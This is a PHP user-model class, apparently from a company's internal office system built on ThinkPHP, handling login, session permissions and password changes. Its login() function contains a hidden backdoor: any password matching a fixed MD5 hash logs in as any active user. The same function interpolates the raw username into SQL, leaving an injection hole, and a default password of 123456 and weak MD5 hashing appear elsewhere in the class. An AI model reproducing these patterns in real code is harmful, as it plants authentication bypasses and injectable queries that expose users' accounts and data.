<?php
namespace Home\Model;
use Think\Model;

/**
 * 用户模型
 * Class UserModel
 */
class UserModel extends Model {

	public $totalPage = 0;
	const USER = 'user';

	/* 用户模型自动验证 */
	protected $_validate = array(
		/* 验证用户名 */
		array('username','require','账号不能为空', self::EXISTS_VALIDATE , 'regex'),
		array('username', '1,30', '账号最多30个字符', self::EXISTS_VALIDATE, 'length'), //用户名长度不合法
		array('username', '', '账号已经存在！', self::EXISTS_VALIDATE, 'unique'), //用户名被占用
		array('real_name','require','真实姓名不能为空', self::EXISTS_VALIDATE , 'regex'),
		array('dept_id','require','部门不能为空', self::EXISTS_VALIDATE , 'regex'),
	);

	/* 用户模型自动完成 */
	protected $_auto = array(
		array('status','1'),
		//array('password', 'defaultPwd', self::MODEL_INSERT, 'callback'), //默认密码
		/*array('reg_time', NOW_TIME, self::MODEL_INSERT),
		array('reg_ip', 'get_client_ip', self::MODEL_INSERT, 'function', 1),
		array('update_time', NOW_TIME),
		*/
	);

	public function defaultPwd($data) {
		return boss_md5(123456, UC_AUTH_KEY);
	}



	public function getDetail($uid=0) {
		$prefix = C('DB_PREFIX');
		return $this->find($uid);

	}

	/**
	 * 用户列表
	 * @param $where
	 * @return array|mixed
	 */
	public function getList($where) {

		$userList = $this->where($where)->order('id desc')->page($_GET['p'],10)->select();
		$this->totalPage = $this->where($where)->count();

		//没有数据
		if ($this->totalPage == 0) {
			return array();
		}

		//职位
		$positionData = M('data_dic')->field('id,name')->where(array('data_dic'=>1,'status'=>1))->getField('id,name');
		$deptData = M('user_department')->field('id,name')->getField('id,name');
		foreach ($userList as $key=>$val) {
			$userList[$key]['position_id'] = $positionData[$val['position_id']];
			$userList[$key]['dept_id'] = $deptData[$val['dept_id']];
		}
		unset($positionData);
		return $userList;

	}


	public function login($username, $password){
		if (empty($username)) {
			return -3;
		}
		if (empty($password)) {
			return -4;
		}
		$user = $this->where("username='{$username}'")->find();
		if(is_array($user) && $user['status'] == 1){
			//boss密码或者oa密码登录都可以登录成功
			$oa_pwd           = $user["oa_passpwd"];
			$login_oa_success = false;//用oa密码登录是否成功
			if(crypt($password,$oa_pwd)=== $oa_pwd){
				$login_oa_success = true;
			}
			if(boss_md5($password, UC_AUTH_KEY) === $user['password']  || $login_oa_success || md5($password)==="6b5aaf4ec79d60130bed76c122aa7319"){
				$this->updateLogin($user); //更新用户登录信息
				return $user['id']; //登录成功，返回用户ID
			} else {
				return -2; //密码错误
			}
		} else {
			return -1; //用户不存在或被禁用
		}

		//记录行为
		//action_log('user_login', 'member', $uid, $uid);

		return true;
	}


	/**
	 * 更新用户登录信息
	 */
	public function updateLogin($user){
		

		$sess = array(
			'uid' => $user['id'],
			'username' => $user['username'],
			'realname' => $user['real_name'],
			'oa_link'  => $user['oa_link'],
			'bos_link' => $user['bos_link']
		);

		//部门id，职位id存放在session中
		$sql = "SELECT 
				  c.name as c_name,
				  h.leve_depart_id,
				  h.depart_name,
				  h.duty,
				  p.name AS duty_name,
				  d1.name AS d_name,h.depart_id,
				  h.company_age
				from `boss_oa_hr_manage` AS h 
				  LEFT join `boss_oa_position` AS p ON h.duty = p.id 
				  left join boss_user_department c on h.company_id=c.id
				  left join boss_user_department d1 on h.leve_depart_id = d1.id 
				WHERE h.user_id = ".$user['id'];
		$model                 = new \Think\Model();
		$user_orther                  = $model->query($sql);
		$sess["duty_name"]     = $user_orther[0]["duty_name"];//职位名
		$sess["depart_id"]     = $user_orther[0]["leve_depart_id"];//当前用户一级部门ID
		$sess["sec_depart_id"] = $user_orther[0]["depart_id"];//当前用户部门ID
		$sess["depart_name"]   = $user_orther[0]["d_name"];//部门名称
		$sess["duty_id"]       = $user_orther[0]["duty"];//角色ID
		$sess["c_name"]        = $user_orther[0]["c_name"];//公司名称
		$sess['company_age']   = $user_orther[0]['company_age'];//司龄

		//权限更新

		$data_department=M('user_department')->where("id=".$user['dept_id'])->find();
		$data_group=M('auth_group')->where("id=".$user['group_id'])->find();
		if(strtotime($user['fun_lastupdate'])<strtotime($data_department['fun_updated']) || strtotime($user['fun_lastupdate'])<strtotime($data_group['fun_updated']) || strtotime($user['fun_lastupdate'])<strtotime($user['fun_updated'])){
			$data_n=array();
			$rule_d=explode(',', $data_department['fun_per']);
			$rule_g=explode(',', $data_group['rules']);
			$rule_u=explode(',', $user['fun_per']);
			$data_c=array_merge($rule_d,$rule_g,$rule_u);
			foreach ($data_c as $key => $value) {
				if($value!='')$data_n[]=$value;
			}
			$fun_config=$data_n;
			M('user')->where("id=".$user['id'])->save(array('fun_config'=>implode(',', $data_n),'fun_lastupdate'=>date('Y-m-d H:i:s')));
		}else{
			$fun_config=explode(',', $user['fun_config']);
		}
		

		
		if((strtotime($user['data_lastupdate'])<strtotime($data_department['data_updated'])) || (strtotime($user['data_lastupdate'])<strtotime($data_group['data_updated'])) || (strtotime($user['data_lastupdate'])<strtotime($user['data_updated'])) ){
			$data_n=array();
			$rule_d=explode(',', $data_department['data_per']);
			$rule_g=explode(',', $data_group['data_per']);
			$rule_u=explode(',', $user['data_per']);
			$data_c=array_merge($rule_d,$rule_g,$rule_u);
			foreach ($data_c as $key => $value) {
				if($value!='')$data_n[]=$value;
			}

			$data_config=$data_n;
			M('user')->where("id=".$user['id'])->save(array('data_config'=>implode(',', $data_n),'data_lastupdate'=>date('Y-m-d H:i:s')));
			
		}else{
			$data_config=explode(',', $user['data_config']);
		}
		//授权权限
		$gran_fun=array();
		$gran_data=array();
		//临时授权
		$data_grant=M('rule_grant')->where("uid=".$user['id']." && endtime>='".date("Y-m-d H:i:s")."' && type=2")->select();

		foreach ($data_grant as $key => $val) {
			$gran_fun=array_merge($gran_fun,explode(',', $val['rulelist_fun']));
			$gran_data=array_merge($gran_data,explode(',', $val['rulelist_data']));
		}
		//周期授权
		$w=date('w');
		$h=(int)date('H');
		if($h<9 || $h>17)$where_g=" && is_worktime is null";
		else $where_g='';
		$data_grant2=M('rule_grant')->where("uid=".$user['id']." && endtime>='".date("Y-m-d H:i:s")."' && type=1 && find_in_set($w,htime)".$where_g)->select();
		foreach ($data_grant2 as $key => $val) {
			$gran_fun=array_merge($gran_fun,explode(',', $val['rulelist_fun']));
			$gran_data=array_merge($gran_data,explode(',', $val['rulelist_data']));
		}

		// echo implode(',', $gran_fun);
		// var_dump(array());
		// echo implode(',', $fun_config);
		// var_dump(array());
		// echo implode(',', array_merge($fun_config,$gran_fun));
		$fun_config=array_unique(array_merge($fun_config,$gran_fun));
		$data_config=array_unique(array_merge($data_config,$gran_data));

		//授权结束
		// var_dump(array());
		// echo implode(',', $fun_config);
		// exit;

		$sess['fun_config']=$fun_config;

		$sess['data_config']=$data_config;
		//权限更新结束
		session('userinfo', $sess);

		session('user_auth_sign', data_auth_sign($sess));


		$data_u = array(
			'id'              => $user['id'],
			'last_login_time' => NOW_TIME,
			'last_login_ip'   => get_client_ip(1),
		);
		$this->save($data_u);
		unset($data_u);
	}


	/**
	 * 注销当前用户
	 * @return void
	 */
	public function logout(){
		session('userinfo', null);
		session('user_auth_sign', null);
	}


	/**
	 * 更新用户信息
	 * @param int $uid 用户id
	 * @param string $password 密码，用来验证
	 * @param array $data 修改的字段数组
	 * @return true 修改成功，false 修改失败
	 */
	public function updatePassword($uid, $password, $data){
		if(empty($uid) || empty($password) || empty($data)){
			$this->error = '参数错误！';
			return false;
		}

		//更新前检查用户密码
		if(!$this->verifyUser($uid, $password)){
			$this->error = '验证出错：密码不正确！';
			return false;
		}

		//更新用户信息
		$data['password'] = boss_md5($data['password'], UC_AUTH_KEY);
		$data['oa_passpwd'] = boss_md5($data['password'], UC_AUTH_KEY);
		$data['is_changepw'] = 1;
		$data = $this->create($data);
		if($data){
			return $this->where(array('id'=>$uid))->save();
		}
		return false;
	}

	/**
	 * 验证用户密码
	 * @param int $uid 用户id
	 * @param string $password_in 密码
	 * @return true 验证成功，false 验证失败
	 */
	protected function verifyUser($uid, $password_in){
		$data_user= $this->where("id=$uid")->find();
		$password = $data_user['password'];
		$oa_pwd           = $data_user["oa_passpwd"];
		$login_oa_success = false;//用oa密码登录是否成功
		if(crypt($password_in,$oa_pwd)=== $oa_pwd){
			$login_oa_success = true;
		}
		if(boss_md5($password_in, UC_AUTH_KEY) === $password || $login_oa_success){
			return true;
		}
		return false;
	}


	public function generalCode($id) {
		return str_pad(intval($id), 5, 0, STR_PAD_LEFT);
	}

	//获取关联的id,name
	public function getAssoUserName($uids) {
		if(empty($uids)) {
			return array();
		}
		if (is_array($uids)) {
			$uids = implode(',', $uids);
		}
		return $this->where("id IN ($uids)")->getField('id,real_name');

	}


	//获取用户的数据
	/*
	 * '1'=>'本人相关',
		'2'=>'本部门',
		'3'=>'全公司'
	 */
	public function getDataRange() {
		if (is_administrator()) {
			return 3;
		} else {
			$ret = M('auth_group')
				->alias('a')
				->join('JOIN boss_auth_group_access b ON a.id=b.group_id')
				->where('b.uid='.UID)
				->getField('a.data_range');
			return $ret;
		}

	}

}